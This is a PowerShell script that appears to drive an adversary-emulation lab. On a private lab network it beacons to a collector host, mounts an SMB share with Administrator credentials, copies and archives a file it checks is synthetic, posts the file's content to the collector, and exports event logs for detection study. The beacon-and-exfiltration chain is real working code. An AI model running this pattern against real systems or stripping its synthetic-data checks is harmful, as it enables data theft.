param([Parameter(Mandatory=$true)][ValidatePattern('^course-[0-9TZ]+$')][string]$RunId,
      [Parameter(Mandatory=$true)][string]$LabPassword)
$ErrorActionPreference='Stop'
$root=Join-Path 'C:\AttackTraceLab' $RunId
New-Item -ItemType Directory -Path $root | Out-Null
$timeline=New-Object System.Collections.Generic.List[object]
function Record($Stage,$Detail){
    $timeline.Add([pscustomobject]@{TimeUtc=(Get-Date).ToUniversalTime().ToString('o');RunId=$RunId;Stage=$Stage;Detail=$Detail;Classification='controlled_emulation'})
    $timeline | ConvertTo-Json -Depth 6 | Set-Content -LiteralPath (Join-Path $root 'timeline.json') -Encoding UTF8
}
function Post-Lab($Path,$Data){
    $client=New-Object Net.WebClient
    $client.Proxy=$null
    $client.Headers['Content-Type']='application/json'
    try { return $client.UploadString(('http://192.168.56.40:8080'+$Path),($Data | ConvertTo-Json -Compress)) }
    finally {$client.Dispose()}
}
$start=Get-Date
Record 'start' 'Authorized guest orchestration, not remote code execution or credential theft'
$acl=Get-Acl -LiteralPath $root
$sid=New-Object System.Security.Principal.SecurityIdentifier('S-1-1-0')
$rule=New-Object System.Security.AccessControl.FileSystemAuditRule($sid,'ReadData,WriteData,AppendData','ContainerInherit,ObjectInherit','None','Success')
$acl.AddAuditRule($rule)
Set-Acl -LiteralPath $root -AclObject $acl
$null=Post-Lab '/beacon' @{run_id=$RunId;host='officepc01';mode='controlled_emulation'}
Record 'beacon' '192.168.56.40:8080'
$credential=New-Object Management.Automation.PSCredential('CORE01\Administrator',(ConvertTo-SecureString $LabPassword -AsPlainText -Force))
try {
    New-PSDrive -Name COURSE -PSProvider FileSystem -Root '\\192.168.80.60\CORE-DATA' -Credential $credential -Scope Script | Out-Null
    $content=(Get-Content 'COURSE:\finance-planning.txt' -Raw).ToString()
    if($content.Length -gt 4096 -or -not $content.Contains('AttackTraceLab synthetic finance planning file')){throw 'Refusing non-synthetic data'}
    $file=Join-Path $root 'synthetic-collected.txt'
    Set-Content -LiteralPath $file -Value $content -Encoding UTF8
    Record 'authorized_smb_collection' '192.168.80.60:445 / CORE-DATA / synthetic finance file'
} finally {Remove-PSDrive COURSE -ErrorAction SilentlyContinue}
Start-Process -FilePath "$env:SystemRoot\System32\whoami.exe" -ArgumentList '/user' -RedirectStandardOutput (Join-Path $root 'identity.txt') -Wait -WindowStyle Hidden
Compress-Archive -LiteralPath $file -DestinationPath (Join-Path $root 'synthetic.zip')
Record 'archive_staging' 'synthetic.zip'
$hash=(Get-FileHash -LiteralPath $file -Algorithm SHA256).Hash
$sha=[Security.Cryptography.SHA256]::Create()
try {$contentHash=([BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($content)))).Replace('-','').ToLowerInvariant()}
finally {$sha.Dispose()}
$null=Post-Lab '/result' @{run_id=$RunId;host='officepc01';mode='controlled_emulation';content=$content;sha256=$contentHash;source_file_sha256=$hash;hash_scope='content_utf8';transfer_kind='text_not_archive'}
Record 'synthetic_transfer' '192.168.56.40:8080; no real user documents transferred'
$tcp=New-Object Net.Sockets.TcpClient
try {$task=$tcp.ConnectAsync('192.168.80.60',3389);$allowed=$task.Wait(3000) -and $tcp.Connected}
catch {$allowed=$false}
finally {$tcp.Dispose()}
Record 'negative_control_rdp' @{Connected=$allowed}
if($allowed){throw 'Unexpected RDP reachability'}
Start-Sleep -Seconds 2
& wevtutil.exe epl Security "$root\security.evtx" /q:"*[System[TimeCreated[timediff(@SystemTime) <= 600000]]]"
if($LASTEXITCODE -ne 0){throw 'Security export failed'}
& wevtutil.exe epl Microsoft-Windows-PowerShell/Operational "$root\powershell.evtx" /q:"*[System[TimeCreated[timediff(@SystemTime) <= 600000]]]"
if($LASTEXITCODE -ne 0){throw 'PowerShell export failed'}
Record 'complete' @{Success=$true;Started=$start.ToUniversalTime().ToString('o')}
